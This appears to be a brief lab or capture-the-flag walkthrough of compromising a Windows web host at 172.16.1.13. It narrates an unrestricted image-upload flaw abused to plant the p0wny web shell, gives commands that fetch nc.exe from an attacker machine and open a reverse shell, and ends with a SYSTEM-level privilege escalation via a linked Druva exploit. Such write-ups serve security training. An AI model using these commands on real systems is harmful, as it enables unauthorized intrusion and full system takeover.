As we found a perl script in /cgi-bin/ we start fuzzing for another scripts and we found http://172.16.1.13/cgi-bin/cgi.cgi but after numerous tries we found it not vulnerable.

After some more fuzzing we found http://172.16.1.13/discuss/ where we can register a new user and it prompt for a user image. We found the directory where the images are uploaded after check the contact section (copy link of image and we found http://172.16.1.13/discuss/ups/1.jpg), so we upload a malicious image file. We uploaded directly the **[p0wny shell](https://github.com/flozz/p0wny-shell)** and it worked, so we get a shell in http://172.16.1.13/discuss/ups/p0wny.php

Download nc.exe (using -o flag, as IE has not been configured yet) and get a proper shell
	`powershell wget http://172.16.1.100:1234/nc.exe -o C:\Windows\Temp\nc.exe`
	`C:\Windows\Temp\nc.exe -e cmd.exe 172.16.1.100 9001`

In "Program Files (x86)" folder we found Druva which seems exploitable. After try **[this exploit](https://www.exploit-db.com/exploits/49211)** and running again the nc.exe reverse shell we got nt authority\\system
